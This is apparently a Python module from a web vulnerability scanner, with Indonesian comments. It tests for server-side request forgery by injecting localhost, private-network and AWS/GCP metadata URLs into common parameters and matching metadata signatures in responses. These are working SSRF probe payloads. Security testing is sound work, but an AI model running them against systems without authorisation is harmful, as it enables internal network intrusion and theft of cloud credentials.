import requests
import socket

# SSRF payloads untuk test internal network access
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
]

# Signature yang menandakan SSRF berhasil
SSRF_SIGNATURES = [
    "ami-id", "instance-id",  # AWS metadata
    "computemetadata",         # GCP metadata
    "private-ipv4",
    "local-hostname",
]

def test_ssrf(url, params):
    """Test Server-Side Request Forgery."""
    results = []
    
    # Parameter yang sering vulnerable terhadap SSRF
    ssrf_params = ["url", "uri", "path", "dest", "redirect", "file", "load", "fetch"]
    
    # Gabungkan dengan params dari URL
    all_params = list(params.keys()) + [p for p in ssrf_params if p not in params]
    
    for param in all_params:
        for payload in SSRF_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            
            try:
                response = requests.get(url, params=test_params, timeout=10, verify=False)
                body = response.text.lower()
                
                # Cek signature metadata service
                for sig in SSRF_SIGNATURES:
                    if sig in body:
                        results.append({
                            "type": "Server-Side Request Forgery (SSRF)",
                            "severity": "CRITICAL",
                            "param": param,
                            "payload": payload,
                            "detail": f"Internal service accessible (signature: '{sig}')"
                        })
                        return results
                
                # Cek apakah response mengandung private IP
                if any(ip in body for ip in ["127.0.0.1", "localhost", "192.168.", "10.0.", "172.16."]):
                    results.append({
                        "type": "Possible SSRF",
                        "severity": "HIGH",
                        "param": param,
                        "payload": payload,
                        "detail": "Response mengandung private IP address"
                    })
                    
            except requests.RequestException:
                pass
    
    return results
